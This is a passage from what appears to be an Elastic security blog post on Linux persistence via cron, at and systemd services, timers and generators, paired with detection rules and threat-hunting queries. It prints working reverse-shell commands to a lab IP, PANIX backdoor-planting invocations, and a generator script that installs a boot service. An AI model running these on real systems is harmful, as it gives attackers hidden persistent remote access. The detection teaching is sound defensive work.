so:\"]}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:`sudo ./panix.sh --cron --default --ip 192.168.1.1 --port 2001\n[+] Cron job persistence established.\n`})}),`\n`,(0,i.jsxs)(e.p,{children:[\"The default setting for the root user will create a cron file at \",(0,i.jsx)(e.code,{children:\"/etc/cron.d/freedesktop_timesync1\"}),\" that calls out to the attacker system every minute. When looking at the events, we can see the following:\"]}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/primer-on-persistence-mechanisms/image11.png\",alt:\"Events generated as a result of cron persistence establishment\",title:\"Events generated as a result of cron persistence establishment\",width:\"1440\",height:\"464\"})}),`\n`,(0,i.jsxs)(e.p,{children:[\"When PANIX was executed, the cron job was created, \",(0,i.jsx)(e.code,{children:\"/usr/sbin/cron\"}),\" read the contents of the cron file and executed it, after which a network connection was established. Analyzing this chain of events, we can identify several detection capabilities for this and other proof-of-concepts.\"]}),`\n`,(0,i.jsxs)(e.p,{children:[\"Elastic SIEM includes over 1,000 prebuilt rules and more than 200 specifically dedicated to Linux. These rules run on the Elastic cluster and are designed to detect threat techniques that are available in our public \",(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/tree/main\",rel:\"nofollow\",children:\"detection rules repository\"}),\". Our prevention capabilities include behavioral endpoint rules and memory/file signatures, which are utilized by Elastic Defend and can be found in our public \",(0,i.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts\",rel:\"nofollow\",children:\"protection artifacts repository\"}),\".\"]}),`\n`,(0,i.jsx)(e.div,{className:\"table-container\",children:(0,i.jsxs)(e.table,{children:[(0,i.jsx)(e.thead,{children:(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.th,{children:\"Category\"}),(0,i.jsx)(e.th,{children:\"Coverage\"})]})}),(0,i.jsxs)(e.tbody,{children:[(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{children:\"File\"}),(0,i.jsx)(e.td,{children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_cron_job_creation.toml\",rel:\"nofollow\",children:\"Cron Job Created or Modified\"})})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{}),(0,i.jsx)(e.td,{children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_etc_file_creation.toml\",rel:\"nofollow\",children:\"Suspicious File Creation in /etc for Persistence\"})})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{}),(0,i.jsx)(e.td,{children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/rules/integrations/fim/persistence_suspicious_file_modifications.toml\",rel:\"nofollow\",children:\"Potential Persistence via File Modification\"})})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{children:\"Process\"}),(0,i.jsx)(e.td,{children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/persistence_hidden_payload_executed_via_scheduled_job.toml\",rel:\"nofollow\",children:\"Hidden Payload Executed via Scheduled Job\"})})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{}),(0,i.jsx)(e.td,{children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/persistence_scheduled_job_executing_binary_in_unusual_location.toml\",rel:\"nofollow\",children:\"Scheduled Job Executing Binary in Unusual Location\"})})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{}),(0,i.jsx)(e.td,{children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/linux/persistence_scheduled_task_unusual_command_execution.toml\",rel:\"nofollow\",children:\"Scheduled Task Unusual Command Execution\"})})]})]})]})}),`\n`,(0,i.jsxs)(e.p,{children:[\"The file category has three different rules, the first two focusing on creation/modification using Elastic Defend, while the third focuses on modification through \",(0,i.jsx)(e.a,{href:\"https://www.elastic.co/docs/current/integrations/fim\",rel:\"nofollow\",children:\"File Integrity Monitoring (FIM)\"}),\". FIM can be set up using \",(0,i.jsx)(e.a,{href:\"https://www.elastic.co/guide/en/beats/auditbeat/current/auditbeat-module-file_integrity.html\",rel:\"nofollow\",children:\"Auditbeat\"}),\" or via the Fleet integration. To correctly set up FIM, it is important to specify full paths to the files that FIM should monitor, as it does \",(0,i.jsx)(e.em,{children:\"not\"}),\" allow for wildcards. Therefore, Potential Persistence via File Modification is a rule that requires manual setup and tailoring to your specific needs, as it will require individual entries depending on the persistence technique you are trying to detect.\"]}),`\n`,(0,i.jsx)(e.h3,{id:\"t1053002---scheduled-taskjob-at\",children:\"T1053.002 - scheduled task/job: at\"}),`\n`,(0,i.jsxs)(e.p,{children:[(0,i.jsx)(e.a,{href:\"https://man7.org/linux/man-pages/man1/at.1p.html\",rel:\"nofollow\",children:\"At\"}),\" is a utility for scheduling one-time tasks to run at a specified time in the future on Linux systems. Unlike cron, which handles recurring tasks, At is designed for single executions. The At daemon (\",(0,i.jsx)(e.code,{children:\"atd\"}),\") manages and executes these scheduled tasks at the specified time.\"]}),`\n`,(0,i.jsx)(e.p,{children:\"An At job is defined by specifying the exact time it should run. Depending on the configuration, users can schedule At jobs with either user or root permissions. This makes At a straightforward option for scheduling tasks without the need for persistent or repeated execution, but less useful for attackers. Additionally, At is not present on most Linux distributions by-default, which makes leveraging it even less trivial. However, it is still used for persistence, so we should not neglect the technique.\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"At jobs are stored in \",(0,i.jsx)(e.code,{children:\"/var/spool/cron/atjobs/\"}),\". Besides the At job, At also creates a spool file in the \",(0,i.jsx)(e.code,{children:\"/var/spool/cron/atspool/\"}),\" directory. These job files contain the details of the scheduled tasks, including the commands to be executed and the scheduled times.\"]}),`\n`,(0,i.jsx)(e.p,{children:\"To schedule a task using At, you simply provide the command to run and the time for execution. The syntax is straightforward:\"}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:`echo \"/bin/bash -c 'sh -i \u003e\u0026 /dev/tcp/192.168.1.1/1337 0\u003e\u00261'\" | at now + 1 minute\n`})}),`\n`,(0,i.jsxs)(e.p,{children:[\"The above example schedules a task to run one minute from the current time. The time format can be flexible, such as \",(0,i.jsx)(e.code,{children:\"at 5 PM tomorrow\"}),\" or \",(0,i.jsx)(e.code,{children:\"at now + 2 hours\"}),\". At job details can be listed using the \",(0,i.jsx)(e.code,{children:\"atq\"}),\" command, and specific jobs can be removed using \",(0,i.jsx)(e.code,{children:\"atrm\"}),\".\"]}),`\n`,(0,i.jsxs)(e.p,{children:[\"At is useful for one-time task scheduling and complements cron for users needing recurring and single-instance task scheduling solutions. MITRE specifies more information and real-world examples related to this technique in \",(0,i.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1053/002/\",rel:\"nofollow\",children:\"T1053.002\"}),\".\"]}),`\n`,(0,i.jsx)(e.h4,{id:\"persistence-through-t1053002---at\",children:\"Persistence through T1053.002 - At\"}),`\n`,(0,i.jsx)(e.p,{children:\"You can leverage the above command structure or use PANIX to set up an At job. Ensure At is installed on your system and the time settings are correct, as this might interfere with the execution.\"}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:`./panix.sh --at --default --ip 192.168.1.1 --port 2002 --time 14:49\njob 15 at Tue Jun 11 14:49:00 2024\n[+] At job persistence established.\n`})}),`\n`,(0,i.jsx)(e.p,{children:\"By default, depending on the privileges used to run the program, a reverse connection will be established at the time interval the user specified. Looking at the events in Discover:\"}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/primer-on-persistence-mechanisms/image2.png\",alt:\"Events generated as a result of At persistence establishment\",title:\"Events generated as a result of At persistence establishment\",width:\"1440\",height:\"535\"})}),`\n`,(0,i.jsxs)(e.p,{children:[\"We see the execution of PANIX, which is creating the At job. Next, At(d) creates two files, an At job and an At spool. At the correct time interval, the At job is executed, after which the reverse connection to the attack IP is established. Looking at these events, we have fewer behavioral coverage opportunities than we have for cron, as behaviorally, it is just \",(0,i.jsx)(e.code,{children:\"/bin/sh\"}),\" executing a shell command. However, we can still identify the following artifacts:\"]}),`\n`,(0,i.jsx)(e.div,{className:\"table-container\",children:(0,i.jsxs)(e.table,{children:[(0,i.jsx)(e.thead,{children:(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.th,{children:\"Category\"}),(0,i.jsx)(e.th,{children:\"Coverage\"})]})}),(0,i.jsxs)(e.tbody,{children:[(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{children:\"File\"}),(0,i.jsx)(e.td,{children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_at_job_creation.toml\",rel:\"nofollow\",children:\"At Job Created or Modified\"})})]}),(0,i.jsxs)(e.tr,{children:[(0,i.jsx)(e.td,{}),(0,i.jsx)(e.td,{children:(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/rules/integrations/fim/persistence_suspicious_file_modifications.toml\",rel:\"nofollow\",children:\"Potential Persistence via File Modification\"})})]})]})]})}),`\n`,(0,i.jsx)(e.h3,{id:\"t1053---scheduled-taskjob-honorable-mentions\",children:\"T1053 - scheduled task/job: honorable mentions\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"Several other honorable mentions for establishing persistence through scheduled tasks/jobs include \",(0,i.jsx)(e.a,{href:\"https://www.man7.org/linux/man-pages/man8/anacron.8.html\",rel:\"nofollow\",children:\"Anacron\"}),\", \",(0,i.jsx)(e.a,{href:\"https://man.archlinux.org/man/fcron.8.en\",rel:\"nofollow\",children:\"Fcron\"}),\", \",(0,i.jsx)(e.a,{href:\"https://manpages.ubuntu.com/manpages/xenial/man1/tsp.1.html\",rel:\"nofollow\",children:\"Task Spooler\"}),\", and \",(0,i.jsx)(e.a,{href:\"https://man7.org/linux/man-pages/man1/batch.1p.html\",rel:\"nofollow\",children:\"Batch\"}),'. While these tools are less commonly leveraged by malware due to their non-default installation and limited versatility compared to cron and other mechanisms, they are still worth noting. We include behavioral detection rules for some of these in our persistence rule set. For example, Batch jobs are saved in the same location as At jobs and are covered by our \"',(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_at_job_creation.toml\",rel:\"nofollow\",children:\"At Job Created or Modified\"}),'\" rule. Similarly, Anacron jobs are covered through our \"',(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/rules/linux/persistence_cron_job_creation.toml\",rel:\"nofollow\",children:\"Cron Job Created or Modified\"}),'\" rule, as Anacron integrates with the default Cron persistence detection setup.']}),`\n`,(0,i.jsx)(e.h3,{id:\"hunting-for-t1053---scheduled-taskjob\",children:\"Hunting for T1053 - scheduled task/job\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"Besides relying on Elastic\\u2019s pre-built \",(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules\",rel:\"nofollow\",children:\"detection\"}),\" and \",(0,i.jsx)(e.a,{href:\"https://github.com/elastic/protections-artifacts\",rel:\"nofollow\",children:\"endpoint rules\"}),\", a defender will greatly benefit from manual threat hunting. As part of Elastic\\u2019s 8.14 release, the general availability of the \",(0,i.jsx)(e.a,{href:\"https://www.elastic.co/guide/en/elasticsearch/reference/current/esql.html\",rel:\"nofollow\",children:\"Elasticsearch Query Language (ES|QL) language\"}),\" was introduced. ES|QL provides a powerful way to filter, transform, and analyze data stored in Elasticsearch. For this use case, we will leverage ES|QL to hunt through all the data in an Elasticsearch stack for traces of cron, At, Anacron, Fcron, Task Spooler,\",(0,i.jsx)(e.code,{children:\" \"}),\"and Batch persistence.\"]}),`\n`,(0,i.jsx)(e.p,{children:\"We can leverage the following ES|QL query that can be tailored to your specific environment:\"}),`\n`,(0,i.jsx)(e.p,{children:\"This query returns 76 hits that could be investigated. Some are related to PANIX, others to real malware detonations, and some are false positives.\"}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/primer-on-persistence-mechanisms/image5.png\",alt:\"Results of the ES|QL hunt for scheduled task persistence establishment\",title:\"Results of the ES|QL hunt for scheduled task persistence establishment\",width:\"1440\",height:\"339\"})}),`\n`,(0,i.jsx)(e.p,{children:\"Dealing with false positives is crucial, as system administrators and other authorized personnel commonly use these tools. Differentiating between legitimate and malicious use is essential for maintaining an effective security posture. Accurately identifying the intent behind using these tools helps minimize disruptions caused by false alarms while ensuring that potential threats are addressed promptly.\"}),`\n`,(0,i.jsx)(e.p,{children:\"Programs similar to cron also have an execution history, as all of the scripts it executes will have cron as its parent. This allows us to hunt for unusual process executions through ES|QL:\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"This example performs aggregation using a \",(0,i.jsx)(e.code,{children:\"distinct_count\"}),\" of \",(0,i.jsx)(e.code,{children:\"host.id\"}),\". If an anomalous entry is observed, \",(0,i.jsx)(e.code,{children:\"host_count\"}),\" can be removed, and additional fields such as \",(0,i.jsx)(e.code,{children:\"host.name\"}),\" and \",(0,i.jsx)(e.code,{children:\"user.name\"}),\" can be added to the by section. This can help find anomalous behavior on specific hosts rather than across the entire environment. This could also be an additional pivoting opportunity if suspicious processes are identified.\"]}),`\n`,(0,i.jsx)(e.p,{children:\"In this case, the query returns 37 results, most of which are true positives due to the nature of the testing stack in which this is executed.\"}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/primer-on-persistence-mechanisms/image3.png\",alt:\"Results of the ES|QL hunt for scheduled task execution persistence establishment\",title:\"Results of the ES|QL hunt for scheduled task execution persistence establishment\",width:\"1440\",height:\"488\"})}),`\n`,(0,i.jsxs)(e.p,{children:[\"In your environment, this will likely return a massive amount of results. You may consider reducing/increasing the number of days that are being searched. Additionally, the total count of entries (cc) and host_count can be increased/decreased to make sense for your environment. Every network is unique; therefore, a false positive in one environment may not be a false positive for every environment. Additionally, the total count of entries (\",(0,i.jsx)(e.code,{children:\"cc\"}),\") and \",(0,i.jsx)(e.code,{children:\"host_count\"}),\" can be increased/decreased to make sense for your environment. Every network is unique, and therefore a false-positive in one environment may not be a false-positive in another. Adding exclusions specific to your needs will allow for easier hunting.\"]}),`\n`,(0,i.jsxs)(e.p,{children:[\"Besides ES|QL, we can also leverage Elastic\\u2019s \",(0,i.jsx)(e.a,{href:\"https://www.elastic.co/docs/current/integrations/osquery_manager\",rel:\"nofollow\",children:\"OSQuery Manager integration\"}),\". OSQuery is an open-source, cross-platform tool that uses SQL queries to investigate and monitor the operating system's performance, configuration, and security by exposing system information as a relational database. It allows administrators and security professionals to easily query system data and create real-time monitoring and analytics solutions. Streaming telemetry represents activity over time, while OSQuery focuses on static on-disk presence. This opens the door for detecting low-and-slow/decoupled-style attacks and might catch otherwise missed activity through telemetry hunting.\"]}),`\n`,(0,i.jsxs)(e.p,{children:[\"Information on how to set up OSQuery can be found in the \",(0,i.jsx)(e.a,{href:\"https://www.elastic.co/guide/en/kibana/current/osquery.html\",rel:\"nofollow\",children:\"Kibana docs\"}),\", and a blog post explaining OSQuery in depth can be found \",(0,i.jsx)(e.a,{href:\"https://www.elastic.co/blog/gain-upper-hand-over-adversaries-with-osquery-and-elastic\",rel:\"nofollow\",children:\"here\"}),\". We can run the following live query to display all of the cron files present on a particular system:\"]}),`\n`,(0,i.jsxs)(e.p,{children:[\"The following results are returned. We can see the \",(0,i.jsx)(e.code,{children:\"/etc/cron.d/freedesktop_timesync1\"}),\" with a \",(0,i.jsx)(e.code,{children:\"file_last_status_change_time\"}),\" that is recent and differs from the rest of the cron files. This is the backdoor planted by PANIX.\"]}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/primer-on-persistence-mechanisms/image4.png\",alt:\"Results of the OSQuery hunt for scheduled task persistence establishment\",title:\"Results of the OSQuery hunt for scheduled task persistence establishment\",width:\"1440\",height:\"246\"})}),`\n`,(0,i.jsx)(e.p,{children:\"If we want to dig deeper, OSQuery also provides a module to read the commands from the crontab file by running the following query:\"}),`\n`,(0,i.jsx)(e.p,{children:\"This shows us the command, the location of the cron job, and the corresponding schedule at which it runs.\"}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/primer-on-persistence-mechanisms/image1.png\",alt:\"Results of the OSQuery crontab hunt\",title:\"Results of the OSQuery crontab hunt\",width:\"1440\",height:\"136\"})}),`\n`,(0,i.jsx)(e.p,{children:\"Analyzing the screenshot, we see two suspicious reverse shell entries, which could require additional manual investigation.\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"An overview of the hunts outlined above, with additional descriptions and references, can be found in our \",(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules\",rel:\"nofollow\",children:\"detection rules repository\"}),\", specifically in the \",(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/tree/main/hunting\",rel:\"nofollow\",children:\"Linux hunting subdirectory\"}),\". We can hunt for uncommon scheduled task file creations or unusual process executions through scheduled task executables by leveraging ES|QL and OSQuery. The \",(0,i.jsx)(e.a,{href:\"https://github.com/elastic/detection-rules/blob/main/hunting/linux/queries/persistence_via_cron.toml\",rel:\"nofollow\",children:\"Persistence via Cron\"}),\" hunt contains several ES|QL and OSQuery queries to aid this process.\"]}),`\n`,(0,i.jsx)(e.h2,{id:\"t1453---create-or-modify-system-process-systemd\",children:\"T1453 - create or modify system process (systemd)\"}),`\n`,(0,i.jsxs)(e.p,{children:[(0,i.jsx)(e.a,{href:\"https://man7.org/linux/man-pages/man1/init.1.html\",rel:\"nofollow\",children:\"Systemd\"}),\" is a system and service manager for Linux, widely adopted as a replacement for the traditional \",(0,i.jsx)(e.a,{href:\"https://manpages.debian.org/testing/sysvinit-core/init.8.en.html\",rel:\"nofollow\",children:\"SysVinit\"}),\" system. It is responsible for initializing the system, managing processes, and handling system resources. Systemd operates through a series of unit files defining how services should be started, stopped, and managed.\"]}),`\n`,(0,i.jsxs)(e.p,{children:[(0,i.jsx)(e.a,{href:\"https://manpages.debian.org/jessie/systemd/systemd.unit.5.en.html\",rel:\"nofollow\",children:\"Unit files\"}),\" have different types, each designed for specific purposes. The Service unit is the most common unit type for managing long-running processes (typically daemons). Additionally, the Timer unit manages time-based activation of other units, similar to cron jobs, but integrated into Systemd.\"]}),`\n`,(0,i.jsxs)(e.p,{children:[\"This section will discuss \",(0,i.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1543/\",rel:\"nofollow\",children:\"T1453\"}),\" for systemd services and generators, and \",(0,i.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1053/\",rel:\"nofollow\",children:\"T1053\"}),\" for systemd timers.\"]}),`\n`,(0,i.jsx)(e.h3,{id:\"t1453002---create-or-modify-system-process-systemd-services\",children:\"T1453.002 - create or modify system process: systemd services\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"The \",(0,i.jsx)(e.a,{href:\"https://www.digitalocean.com/community/tutorials/understanding-systemd-units-and-unit-files\",rel:\"nofollow\",children:\"services\"}),\" managed by systemd are defined by unit files, and are located in default directories, depending on the operating system and whether the service is run system-wide or user-specific. The system-wide unit files are typically located in the following directories:\"]}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"/run/systemd/system/\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"/etc/systemd/system/\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"/etc/systemd/user/\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"/usr/local/lib/systemd/system/\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"/lib/systemd/system/\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"/usr/lib/systemd/system/\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"/usr/lib/systemd/user/\"})}),`\n`]}),`\n`,(0,i.jsx)(e.p,{children:\"User-specific unit files are typically located at:\"}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"~/.config/systemd/user/\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"~/.local/share/systemd/user/\"})}),`\n`]}),`\n`,(0,i.jsxs)(e.p,{children:[\"A basic service unit file consists of three main sections: \",(0,i.jsx)(e.code,{children:\"[Unit]\"}),\", \",(0,i.jsx)(e.code,{children:\"[Service]\"}),\", and \",(0,i.jsx)(e.code,{children:\"[Install]\"}),\", and has the \",(0,i.jsx)(e.code,{children:\".service\"}),\" extension. Here's an example of a simple unit file that could be leveraged for persistence:\"]}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:`[Unit]\nDescription=Reverse Shell\n\n[Service]\nExecStart=/bin/bash -c 'sh -i \u003e\u0026 /dev/tcp/192.168.1.1/1337 0\u003e\u00261'\n\n[Install]\nWantedBy=multi-user.target\n`})}),`\n`,(0,i.jsxs)(e.p,{children:[\"This unit file would attempt to establish a reverse shell connection every time the system boots, running with root privileges. More information and real-world examples related to systemd services are outlined by MITRE in \",(0,i.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1543/002/\",rel:\"nofollow\",children:\"T1543.002\"}),\".\"]}),`\n`,(0,i.jsx)(e.p,{children:\"Relying solely on persistence upon reboot might be too restrictive. Timer unit files can be leveraged to overcome this limitation to ensure persistence on a predefined schedule.\"}),`\n`,(0,i.jsx)(e.h3,{id:\"t1053006---scheduled-taskjob-systemd-timers\",children:\"T1053.006 - scheduled task/job: systemd timers\"}),`\n`,(0,i.jsxs)(e.p,{children:[(0,i.jsx)(e.a,{href:\"https://wiki.archlinux.org/title/systemd/Timers\",rel:\"nofollow\",children:\"Timer units\"}),\" provide a versatile method to schedule tasks, similar to cron jobs but more integrated with the Systemd ecosystem. A timer unit specifies the schedule and is associated with a corresponding service unit that performs the task. Timer units can run tasks at specific intervals, on specific dates, or even based on system events.\"]}),`\n`,(0,i.jsxs)(e.p,{children:[\"Timer unit files are typically located in the same directories as the service unit files and have a \",(0,i.jsx)(e.code,{children:\".timer\"}),\" extension. Coupling timers to services is done by leveraging the same unit file name but changing the extension. An example of a timer unit file that would activate our previously created service every hour can look like this:\"]}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:`[Unit]\nDescription=Obviously not malicious at all\n\n[Timer]\nOnBootSec=1min\nOnUnitActiveSec=1h\n\n[Install]\nWantedBy=timers.target\n`})}),`\n`,(0,i.jsxs)(e.p,{children:[\"Timers are versatile and allow for different scheduling options. Some examples are \",(0,i.jsx)(e.code,{children:\"OnCalendar=Mon,Wed,Fri 17:00:00\"}),\" to run a service every Monday, Wednesday, and Friday at 5:00 PM, and \",(0,i.jsx)(e.code,{children:\"OnCalendar=*-*-* 02:30:00\"}),\" to run a service every day at 2:30 AM. More details and real world examples related to Systemd timers are presented by MITRE in \",(0,i.jsx)(e.a,{href:\"https://attack.mitre.org/techniques/T1053/006/\",rel:\"nofollow\",children:\"T1053.006\"}),\".\"]}),`\n`,(0,i.jsx)(e.h3,{id:\"t1453---create-or-modify-system-process-systemd-generators\",children:\"T1453 - create or modify system process: systemd generators\"}),`\n`,(0,i.jsxs)(e.p,{children:[(0,i.jsx)(e.a,{href:\"https://manpages.debian.org/testing/systemd/systemd.generator.7.en.html\",rel:\"nofollow\",children:\"Generators\"}),\" are small executables executed by systemd at bootup and during configuration reloads. Their main role is to convert non-native configuration and execution parameters into dynamically generated unit files, symlinks, or drop-ins, extending the unit file hierarchy for the service manager.\"]}),`\n`,(0,i.jsxs)(e.p,{children:[\"System and user generators are loaded from the \",(0,i.jsx)(e.code,{children:\"system-generators\"}),\"/ and \",(0,i.jsx)(e.code,{children:\"user-generators\"}),\"/ directories, respectively, with those listed earlier overriding others of the same name. Generators produce output in three priority-based directories: \",(0,i.jsx)(e.code,{children:\"generator.early\"}),\" (highest), \",(0,i.jsx)(e.code,{children:\"generator\"}),\" (medium), and \",(0,i.jsx)(e.code,{children:\"generator.late\"}),\" (lowest). Reloading daemons will re-run all generators and reload all units from disk.\"]}),`\n`,(0,i.jsx)(e.p,{children:\"System-wide generators can be placed in the following directories:\"}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"/run/systemd/system-generators/\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"/etc/systemd/system-generators/\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"/usr/local/lib/systemd/system-generators/\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"/lib/systemd/system-generators/\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"/usr/lib/systemd/system-generators/\"})}),`\n`]}),`\n`,(0,i.jsx)(e.p,{children:\"User-specific generators are placed in the following directories:\"}),`\n`,(0,i.jsxs)(e.ul,{children:[`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"/run/systemd/user-generators/\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"/etc/systemd/user-generators/\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"/usr/local/lib/systemd/user-generators/\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"/lib/systemd/user-generators/\"})}),`\n`,(0,i.jsx)(e.li,{children:(0,i.jsx)(e.code,{children:\"/usr/lib/systemd/user-generators/\"})}),`\n`]}),`\n`,(0,i.jsxs)(e.p,{children:[(0,i.jsx)(e.a,{href:\"https://pberba.github.io/security/2022/02/07/linux-threat-hunting-for-persistence-systemd-generators/\",rel:\"nofollow\",children:\"Pepe Berba's research\"}),\" explores using systemd generators to establish persistence. One method involves using a generator to create a service file that triggers a backdoor on boot. Alternatively, the generator can execute the backdoor directly, which can cause delays if the network service is not yet started, alerting the user. Systemd generators can be binaries or shell scripts. For example, a payload could look like this:\"]}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:`#!/bin/sh\n# Create a systemd service unit file in the late directory\ncat \u003c\u003c-EOL \u003e \"/run/systemd/system/generator.service\"\n[Unit]\nDescription=Generator Service\n\n[Service]\nExecStart=/usr/lib/systemd/system-generators/makecon\nRestart=always\nRestartSec=10\n\n[Install]\nWantedBy=multi-user.target\nEOL\n\nmkdir -p /run/systemd/system/multi-user.target.wants/\nln -s /run/systemd/system/generator.service /run/systemd/system/multi-user.target.wants/generator.service\n\n# Ensure the script exits successfully\nexit 0\n`})}),`\n`,(0,i.jsxs)(e.p,{children:[\"Which creates a new service (\",(0,i.jsx)(e.code,{children:\"generator.service\"}),\"), which in turn executes \",(0,i.jsx)(e.code,{children:\"/usr/lib/systemd/system-generators/makecon\"}),\" on boot. As this method creates a service (albeit via a generator), we will take a closer look at systemd service persistence. Let's examine how these work in practice.\"]}),`\n`,(0,i.jsx)(e.h3,{id:\"persistence-through-t1453t1053---systemd-services-timers-and-generators\",children:\"Persistence through T1453/T1053 - systemd services, timers and generators\"}),`\n`,(0,i.jsxs)(e.p,{children:[\"You can manually create the unit file in the appropriate directory, reload the daemon, enable and start the service, or use PANIX to do that for you. PANIX will create a service unit file in the specified directory, which in turn runs the custom command at a one-minute interval through a timer unit file. You can also use \",(0,i.jsx)(e.code,{children:\"--default\"}),\" with\",(0,i.jsx)(e.code,{children:\" --ip\"}),\", \",(0,i.jsx)(e.code,{children:\"--port,\"}),\" and \",(0,i.jsx)(e.code,{children:\"\\u2013-timer\"}),\".\"]}),`\n`,(0,i.jsx)(e.pre,{children:(0,i.jsx)(e.code,{children:`sudo ./panix.sh --systemd --custom --path /etc/systemd/system/panix.service --command \"/usr/bin/bash -c 'bash -i \u003e\u0026 /dev/tcp/192.168.1.1/2003 0\u003e\u00261'\" --timer\nService file created successfully!\nCreated symlink /etc/systemd/system/default.target.wants/panix.service \\u2192 /etc/systemd/system/panix.service.\nTimer file created successfully!\nCreated symlink /etc/systemd/system/timers.target.wants/panix.timer \\u2192 /etc/systemd/system/panix.timer.\n[+] Persistence established. \n`})}),`\n`,(0,i.jsxs)(e.p,{children:[\"When a service unit is enabled, systemd creates a symlink in the \",(0,i.jsx)(e.code,{children:\"default.target.wants/\"}),\" directory (or another appropriate target directory). This tells systemd to start the \",(0,i.jsx)(e.code,{children:\"panix.service\"}),\" automatically when the system reaches the \",(0,i.jsx)(e.code,{children:\"default.target\"}),\". Similarly, the symlink for the timer unit file tells systemd to activate the timer based on the schedule defined in the timer unit file.\"]}),`\n`,(0,i.jsx)(e.p,{children:\"We can analyze and find out what happened when looking at the documents in Kibana:\"}),`\n`,(0,i.jsx)(e.p,{children:(0,i.jsx)(e.img,{src:\"/assets/images/primer-on-persistence-mechanisms/image9.png\",alt:\"Events generated as a result of systemd service/timer persistence establishment\",title:\"Events generated as a result of systemd service/timer persistence establishment\",width:\"1440\",height:\"579\"})}),`\n`,(0,i.jsxs)(e.p,{children:[\"PANIX is executed, which creates the \",(0,i.jsx)(e.code,{children:\"panix.service\"}),\" and \",(0,i.jsx)(e.code,{children:\"panix.timer\"}),\" units in the corresponding directories. Then, \",(0,i.jsx)(e.code,{children:\"systemctl\"}),\" is used to reload the daemons, after which the \",(0,i.jsx)(e.code,{children:\"panix.timer\"}),\" is enabled and started, enabling systemd to 